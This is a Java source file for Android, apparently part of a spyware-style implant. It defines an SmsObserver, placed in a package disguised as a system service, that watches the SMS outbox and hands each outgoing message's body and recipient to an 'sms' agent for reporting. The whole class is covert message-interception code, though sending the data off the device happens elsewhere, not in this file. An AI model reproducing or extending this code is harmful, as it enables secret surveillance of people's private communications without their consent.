package com.android.service.interfaces;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.android.service.Sms;
import com.android.service.Status;
import com.android.service.agent.AgentManager;
import com.android.service.agent.AgentMessage;

public class SmsObserver extends ContentObserver {
	private static final String TAG = "SmsObserver"; //$NON-NLS-1$

	public SmsObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean bSelfChange) {
		super.onChange(bSelfChange);

		final AgentMessage a = (AgentMessage) AgentManager.self().get("sms");

		if (a == null) {
			return;
		}

		final ContentResolver cr = Status.getAppContext().getContentResolver();

		// Se questa non dovesse piu andare cambiare in "content://sms"
		final Cursor cur = cr.query(Uri.parse("content://sms/outbox"), null, null, null, null); //$NON-NLS-1$

		while (cur.moveToNext()) {
			final String protocol = cur.getString(cur.getColumnIndex("protocol")); //$NON-NLS-1$

			if (protocol != null) {
				return;
			}

			final Sms s = onSmsSend(cur);
			a.notification(s);
		}

		cur.close();
	}

	private Sms onSmsSend(Cursor cur) {
		// int threadId = cur.getInt(cur.getColumnIndex("thread_id"));
		// int status = cur.getInt(cur.getColumnIndex("status"));

		final String body = cur.getString(cur.getColumnIndex("body")); //$NON-NLS-1$
		final String address = cur.getString(cur.getColumnIndex("address")); //$NON-NLS-1$

		return new Sms(address, body, System.currentTimeMillis(), true);
	}
}